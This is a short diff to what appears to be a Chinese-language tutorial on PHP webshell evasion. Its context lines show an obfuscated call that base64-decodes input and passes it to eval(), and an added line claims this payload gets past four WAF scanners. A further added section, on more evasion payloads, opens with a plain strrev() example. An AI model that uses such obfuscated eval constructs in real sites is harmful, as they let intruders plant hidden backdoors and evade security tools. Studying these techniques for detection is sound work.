@@ -86,8 +86,19 @@ $d = "fuck";
 $e = $$d('code');  // base64_decode('code')
 eval($e); 
 ```
+这个`payload`也是绕过以上4个WAF查杀。
 
-
+## 更多免杀payload
+ - - -
+ ### strrev()函数
+ `strrev()` 函数反转字符串。  
+ ```php
+ <?php
+echo strrev("s9mf");
+ ```
+ 输出:  
+ ![12](https://ws1.sinaimg.cn/large/006VEsyOgy1g0r4x9he8mj30cz056wez.jpg)
+ 
 
 
 
